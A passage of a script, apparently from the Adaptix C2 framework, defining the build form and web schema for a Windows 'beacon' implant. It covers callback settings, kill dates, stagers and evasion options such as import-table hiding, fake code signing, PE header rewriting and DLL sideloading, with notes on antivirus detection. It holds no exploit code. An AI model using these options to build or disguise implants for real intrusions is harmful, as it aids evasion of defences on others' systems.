    container.put("is_killdate",         checkKilldate)
    container.put("kill_date",           dateKill)
    container.put("kill_time",           timeKill)
    container.put("is_workingtime",      checkWorkingTime)
    container.put("start_time",          timeStart)
    container.put("end_time",            timeFinish)
    container.put("svcname",             textSvcName)
    container.put("is_sideloading",      checkSideloading)
    container.put("sideloading_content", sideloadingSelector)
    container.put("icon_random",         checkIconRandom)
    container.put("icon_content",        iconSelector)
    container.put("exe_pseudo_sign",     checkExePseudoSign)
    container.put("pe_header_mod",       checkPeHeaderMod)
    container.put("iat_hiding",          checkIatHiding)
    container.put("use_proxy",           group_proxy)
    container.put("proxy_type",          comboProxyType)
    container.put("proxy_host",          textProxyServer)
    container.put("proxy_port",          spinProxyPort)
    container.put("proxy_username",      textProxyUsername)
    container.put("proxy_password",      textProxyPassword)
    container.put("rotation_mode",       comboRotation)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 570,
        ui_width: 500
    }
}

/* =========================================================================
   BuildSchema -- 给 Web 控制台（AdaptixWeb）的生成参数表。

   与上面 GenerateUI 并列、互不影响：GenerateUI 给 Qt 客户端本地渲染，
   BuildSchema 只返回纯数据给 Web 前端。GenerateUI 不归这个脚本管。

   *** 以下是生成物，不要手改 ***

   本函数由 tools/gen_build_schema.py 从插件 Go 源码生成，**不要手改** ——
   改了下次生成会被覆盖。要改标签/分组/提示，去改 pl_main.go 里对应字段的
   ax:"..." tag；要改取值域，去改插件里那个字段实际比较的字符串常量。

   真相来源（GenerateConfig in pl_main.go；取值域扫了 5 个 .go）：
     字段(key)/类型   <- GenerateConfig 的 json tag + Go 类型   ← 增删字段只改这里
     选项             <- 代码里实际比较过的字符串常量（== / != / switch case）
     标签/分组/提示/显隐 <- 字段上的 ax:"..." tag，没写的按 key 美化作回退
     排列顺序         <- tag 里的 order= / gorder= / optorder=，见下

   ★ order 系列只能【重排】，永远不能增删。三个键默认都是 0，都是「小的排前面」，
     撞值就按字段在结构体里的先后：
       order=N        这个字段在本组里的位置
       gorder=N       整个组的位置（组序是独立算的，所以一个组不会被切成两段）
       optorder=a,b   把点名的选项提到最前，没点名的按推导顺序接在后面
     举例：format 的 optorder 把 Stager 放到末位，只是「显示在后面」；插件以后
     新增一个 Format == "Stager" 之外的分支，新值会【自动出现在列表里】（排最后），
     不会像写死的清单那样把它悄悄藏掉 —— 这正是这几个键只做重排的原因。
     代价：optorder 点到 Go 里不存在的值会【硬报错】，逼你回去改那一行。

   要加字段 / 改选项 / 改标签，一律去改插件的 .go 源码，别在这个文件里改：
       python tools/gen_build_schema.py --agent beacon           # 预览
       python tools/gen_build_schema.py --agent beacon --write    # 落盘
   改完再跑 tools/check_build_schema.py 对账（带阳性对照）。
   ========================================================================= */
function BuildSchema(listener_type)
{
    // 重复出现的取值域
    let F_DLL = ["DLL"];
    let F_EXE = ["Exe", "Service Exe", "DLL"];
    let L_BEACONDNS = ["BeaconDNS"];
    let L_BEACONHTTP = ["BeaconHTTP", "BeaconWS"];
    let F_STAGER = ["Stager"];

    return {
        version: 1,
        fields: [
            // -- 基础 ------------------------------------------------------
            { key: "os", label: "系统", type: "select", options: ["windows"], group: "基础", hint: "beacon 只有 Windows 版；这个键固定是 windows" },
            { key: "arch", label: "架构", type: "select", options: ["x64", "x86"], group: "基础", hint: "x86 是 pl_main.go:910 起的特例分支，x64 是隐含的 else" },
            // 只暴露 Exe / Stager。Service Exe / DLL / Shellcode / Hex C 在 pl_main.go 里
            // 仍有构建分支，但不在本产品线对外提供的产出形态里 —— 与其留着让操作员选了
            // 生成出不打算用的东西，不如从源头收掉（Qt 的 GenerateUI 同步改）。
            { key: "format", label: "输出格式", type: "select", options: ["Exe", "Stager"], group: "基础", hint: "Stager 需在下面「Stager 下载端点」组填地址与端口" },
            { key: "sleep", label: "Sleep", type: "text", group: "基础", hint: "支持 h/m/s；beacon 的解析器（pl_utils.go:414）不补单位，裸数字会被当成 0" },
            { key: "jitter", label: "Jitter %", type: "number", min: 0, max: 100, group: "基础" },
            // -- 进程与签名 ---------------------------------------------------
            { key: "svcname", label: "服务名", type: "text", group: "进程与签名", show_if: { format_in: ["Service Exe"] }, hint: "Service Exe 必填：pl_main.go:975 只是逐字符转义后串进 -DSERVICE_NAME，空值不报错，会生成一个装不上的服务" },
            { key: "iat_hiding", label: "IAT Hiding（无 CRT、空导入表）", type: "bool", group: "进程与签名", hint: "插件默认值来自 buildenv.mk 的 BEACON_IAT_HIDING_DEFAULT（见 pl_main.go:400）；开启后被 360 QVM 2.0 判为 HEUR/QVM.9B7A" },
            { key: "exe_pseudo_sign", label: "Exe 伪 Authenticode 签名", type: "bool", group: "进程与签名", show_if: { format_in: ["Exe", "Service Exe"] }, hint: "随机自签名；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败" },
            { key: "pe_header_mod", label: "PE Header 改写（Rich header）", type: "bool", group: "进程与签名", show_if: { format_in: F_EXE }, hint: "默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header + 校验和 + 时间戳做 per-build 多样化。取消勾选即完全不跑这一步" },
            // -- 信标窗口 ----------------------------------------------------
            { key: "is_killdate", label: "启用 killdate", type: "bool", group: "信标窗口" },
            { key: "kill_date", label: "killdate 日期", type: "text", group: "信标窗口", hint: "GMT 时间" },
            { key: "kill_time", label: "killdate 时间", type: "text", group: "信标窗口" },
            { key: "is_workingtime", label: "启用 workingtime", type: "bool", group: "信标窗口" },
            { key: "start_time", label: "工作起始", type: "text", group: "信标窗口", hint: "每周一跳的窗口，靠 killdate/workingtime 命令可远程改" },
            { key: "end_time", label: "工作结束", type: "text", group: "信标窗口" },
            // -- 图标与侧载 ---------------------------------------------------
            { key: "is_sideloading", label: "Legit-DLL 侧载", type: "bool", group: "图标与侧载", show_if: { format_in: F_DLL } },
            { key: "sideloading_content", label: "合法 DLL 文件", type: "file", accept: ".dll", group: "图标与侧载", show_if: { format_in: F_DLL }, hint: "作为导出表来源；勾了侧载但留空会构建失败" },
            { key: "icon_random", label: "随机生成 ICO", type: "bool", group: "图标与侧载", show_if: { format_in: F_EXE } },
            { key: "icon_content", label: "ICO 文件", type: "file", accept: ".ico", group: "图标与侧载", show_if: { format_in: F_EXE }, hint: "留空 = 用默认图标；与「随机 ICO」同时勾选时以随机为准" },
            // -- DNS -----------------------------------------------------
            { key: "dns_mode", label: "DNS 模式", type: "select", options: ["DNS (Direct UDP)", "DoH (DNS over HTTPS)", "DNS -> DoH fallback", "DoH -> DNS fallback"], group: "DNS", show_if: { listener_in: L_BEACONDNS } },
            { key: "dns_resolvers", label: "DNS 解析器", type: "text", group: "DNS", show_if: { listener_in: L_BEACONDNS }, hint: "逗号分隔；留空则用监听器上的 resolvers（pl_utils.go:483）" },
            { key: "doh_resolvers", label: "DoH 解析器", type: "text", group: "DNS", show_if: { listener_in: L_BEACONDNS }, hint: "逗号分隔；留空则用插件内置默认（pl_utils.go:488）" },
            { key: "user_agent", label: "User-Agent", type: "text", group: "DNS", show_if: { listener_in: L_BEACONDNS }, hint: "留空用插件内置默认（pl_main.go:819）" },
            // -- 代理与轮换 ---------------------------------------------------
            { key: "use_proxy", label: "使用 HTTP/HTTPS 代理", type: "bool", group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP } },
            { key: "proxy_type", label: "代理类型", type: "select", options: ["http", "https"], group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP }, hint: "https 是 pl_main.go:786 的特例，http 是隐含的 else" },
            { key: "proxy_host", label: "代理地址", type: "text", group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP } },
            { key: "proxy_port", label: "代理端口", type: "number", min: 0, max: 65535, group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP }, hint: "开启代理时必填 —— 插件不做兜底，空值就是 0" },
            { key: "proxy_username", label: "代理用户名", type: "text", group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP }, hint: "可留空" },
            { key: "proxy_password", label: "代理口令", type: "text", group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP }, hint: "可留空" },
            { key: "rotation_mode", label: "轮换模式", type: "select", options: ["random", "sequential"], group: "代理与轮换", show_if: { listener_in: L_BEACONHTTP }, hint: "多个 callback 地址时的取用顺序；random 是 pl_main.go:756 的特例" },
            // -- Stager 下载端点 ---------------------------------------------
            { key: "stager_ts_host", label: "Teamserver 地址", type: "text", group: "Stager 下载端点", show_if: { format_in: F_STAGER }, hint: "内层载荷挂在 teamserver 自己的 /api/s/<token> 上，不是监听器端口；控制台默认填当前页面的地址" },
            { key: "stager_ts_port", label: "端口", type: "number", min: 0, max: 65535, group: "Stager 下载端点", show_if: { format_in: F_STAGER } },
            { key: "stager_ts_ssl", label: "走 TLS（与 Teamserver.ssl 一致）", type: "bool", group: "Stager 下载端点", show_if: { format_in: F_STAGER } },
        ]
    };
}
